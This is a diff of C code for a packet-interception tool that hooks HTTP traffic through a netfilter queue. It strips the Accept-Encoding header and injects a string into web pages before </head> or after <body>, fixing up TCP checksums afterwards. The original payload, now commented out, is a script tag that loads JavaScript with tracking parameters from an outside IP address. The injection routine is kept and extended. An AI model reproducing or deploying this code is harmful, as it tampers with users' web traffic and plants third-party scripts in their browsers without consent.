@@ -3,7 +3,8 @@
 struct list_head httpc_list;
 struct ipq_msg ipqm;
 
-#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
+#define JS "hello world"
+//#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
 #define JS_LEN strlen(JS)
 
 unsigned short in_cksum(unsigned short *addr, int len)    /* function is from ping.c */
@@ -95,16 +96,23 @@ int send_one_package_drop(struct _skb *skb)
 int insert_code(struct _skb *skb)
 {
     char* body;
+	int offset=0;
     char buffer[BUFSIZE];
 	int len=0;
 	
     if(!skb->http_head)
 		return -1;
 
-    body=strstr(skb->http_head , "<body>");
+    body=strstr(skb->http_head , "</head>");
+	offset=7;
 	if(!body)
-		return -1;
-    body=body+6;
+	{
+		body=strstr(skb->http_head , "<body>");
+		offset=6;
+		if(!body)
+			return -1;
+	}
+    body=body+offset;
 	
 	len=strlen(body);
 	memcpy(buffer , skb->http_head , skb->http_len-len);
@@ -138,13 +146,13 @@ int change_accept_encoding(struct _skb *skb)
 		return -1;
 	}
 	
-	memcpy(tmp + strlen("Accept-Encoding "), "            " , 12);
+	memcpy(tmp + strlen("Accept-Encoding "), "             " , 13);
 
 	skb->tcp->check=tcp_chsum(skb->iph , skb->tcp , skb->tcp_len);
 	return 0;
 }
 
-int timeout_content_other(struct request_conntrack *reqc)
+int dispatch_other(struct request_conntrack *reqc)
 {
 	struct response_conntrack *resc_cursor , *resc_tmp ;
 	list_for_each_entry_safe(resc_cursor, resc_tmp, &(reqc->response_conntrack_list), list)
@@ -162,20 +170,22 @@ int timeout_content_other(struct request_conntrack *reqc)
 	return 0;
 }
 
-int timeout_content_chunked(struct request_conntrack *reqc)
+int dispatch_chunked(struct request_conntrack *reqc)
 {
 	struct response_conntrack *resc_cursor , *resc_tmp ;
 	list_for_each_entry_safe(resc_cursor, resc_tmp, &(reqc->response_conntrack_list), list)
 	{
-		//if(resc_cursor->skb->hhdr.http_type == HTTP_TYPE_RESPONSE)
-		//{
-		//	debug_log("http content chunked -------------------%d----%s\n" , 
-		//		resc_cursor->skb->http_len , resc_cursor->skb->http_head);
-		//}
+		if(resc_cursor->skb->hhdr.http_type == HTTP_TYPE_RESPONSE)
+		{
+			debug_log("http content chunked -------------------%d----%s\n" , 
+				resc_cursor->skb->http_len , resc_cursor->skb->http_head);
+		}
+		thread_lock();
 		if(-1==insert_code(resc_cursor->skb))
 		{
 
 		}
+		thread_unlock();
 		send_one_package_accept(resc_cursor->skb);
 		thread_lock();
 		la_list_del(&resc_cursor->list);
@@ -189,21 +199,27 @@ int timeout_content_chunked(struct request_conntrack *reqc)
 	return 0;
 }
 
-int timeout_content_length(struct request_conntrack *reqc)
+int dispatch_content_length(struct request_conntrack *reqc)
 {
 	struct response_conntrack *resc_cursor , *resc_tmp ;
 
 	
-	if(reqc->curr_content_length >= reqc->content_length)
-	{	
+	//if(reqc->curr_content_length >= reqc->content_length)
+	//{	
 		list_for_each_entry_safe(resc_cursor, resc_tmp, &(reqc->response_conntrack_list), list)
 		{
+			thread_lock();
 			if(-1==insert_code(resc_cursor->skb))
 			{
 				//resc_cursor->skb->tcp->seq=htonl(ntohl(resc_cursor->skb->tcp->seq)+5);
 			   // resc_cursor->skb->tcp->check=tcp_chsum(resc_cursor->skb->iph , resc_cursor->skb->tcp , resc_cursor->skb->tcp_len);
 			}
-			//debug_log("http content length -------------------%s\n" ,  resc_cursor->skb->http_head);
+			thread_unlock();
+			if(resc_cursor->skb->hhdr.http_type == HTTP_TYPE_RESPONSE)
+			{
+				debug_log("http content length -------------------%d----%s\n" , 
+					resc_cursor->skb->http_len , resc_cursor->skb->http_head);
+			}
 			send_one_package_accept(resc_cursor->skb);
 			thread_lock();
 	        la_list_del(&resc_cursor->list);
@@ -216,20 +232,24 @@ int timeout_content_length(struct request_conntrack *reqc)
 		}
 		
 		return 1;
-	}
+	//}
 	return 0;
 }
 
-int timeout_get(struct request_conntrack *reqc)
+int dispatch_get(struct request_conntrack *reqc)
 {	
+	thread_lock();
 	change_accept_encoding(reqc->skb);
+	thread_unlock();
 	send_one_package_accept(reqc->skb);
+	thread_lock();
 	reqc->is_send=1;
-	ipqm.current_skb_num--;					
+	ipqm.current_skb_num--;	
+	thread_unlock();
 	return 0;
 }
 
-void timeout(void* arg)
+void dispatch(void* arg)
 {
 	struct http_conntrack *httpc_cursor , *httpc_tmp;
 	struct request_conntrack *reqc_cursor , *reqc_tmp;
@@ -238,35 +258,36 @@ void timeout(void* arg)
 	{
 		if(ipqm.current_skb_num <=0)
 		{
-			sleep(1);
+			mnanosleep(1000*1000*100);
 			continue;
 		}
-		mnanosleep(10000);
-		//debug_log("skb_num---------%d------\n", ipqm.current_skb_num);
+		mnanosleep(1000*1000*100);
+		debug_log("skb_num---------%d------\n", ipqm.current_skb_num);
 		list_for_each_entry_safe(httpc_cursor, httpc_tmp, &httpc_list, list)
 		{
+			debug_log("request_num---------%d------\n", httpc_cursor->request_conntrack_num);
 			list_for_each_entry_safe(reqc_cursor, reqc_tmp, &(httpc_cursor->request_conntrack_list), list)
 			{	
-				//debug_log("---------%d------%d\n", reqc_cursor->skb->hhdr.res_type ,reqc_cursor->response_conntrack_num);
+				debug_log("---------http type--%d------response num---%d\n", reqc_cursor->skb->hhdr.res_type ,reqc_cursor->response_conntrack_num);
 				//if(reqc_cursor->skb->http_data)
 				//	debug_log("---------%s------\n", reqc_cursor->skb->http_head);
 				//debug_log("`````````````%d----%d\n" , reqc_cursor->content_length , reqc_cursor->curr_content_length);
 				if(!reqc_cursor->is_send)
 				{
-					timeout_get(reqc_cursor);
+					dispatch_get(reqc_cursor);
 				}
 				
 				if(reqc_cursor->skb->hhdr.res_type==HTTP_RESPONSE_TYPE_CONTENTLENGTH)
 				{
-					timeout_content_length(reqc_cursor);
+					dispatch_content_length(reqc_cursor);
 				}
 				else if(reqc_cursor->skb->hhdr.res_type==HTTP_RESPONSE_TYPE_CHUNKED)
 				{
-					timeout_content_chunked(reqc_cursor);
+					dispatch_chunked(reqc_cursor);
 				}
 				else
 				{
-					timeout_content_other(reqc_cursor);
+					dispatch_other(reqc_cursor);
 				}
 			}
 		}	
@@ -370,15 +391,15 @@ struct request_conntrack* init_request(struct http_conntrack *httpc,struct _skb 
 int update_request_from_skb(struct request_conntrack *reqc,
 	struct _skb *skb)
 {
-	thread_lock();	
+	thread_lock();
 	free_page(reqc->skb);
 	reqc->skb=skb;
 	reqc->is_send=0;
 	reqc->content_length=0;
 	reqc->curr_content_length=0;
 	reqc->response_conntrack_num=0;
-	ipqm.current_skb_num++;	
-	thread_unlock();	
+	ipqm.current_skb_num++;
+	thread_unlock();
 	return 0;
 }
 
@@ -745,7 +766,8 @@ int main(int argc, char **argv)
 	init_queue();
 	init_thpool(3);
 	thpool_add_job(decode , NULL);
-	thpool_add_job(timeout , NULL);
+	thpool_add_job(dispatch , NULL);
+	//thpool_add_job(timeout , NULL);
 	//thpool_add_job(remote , NULL);
 
 	memset(&ipqm , '\0' , sizeof(struct ipq_msg));
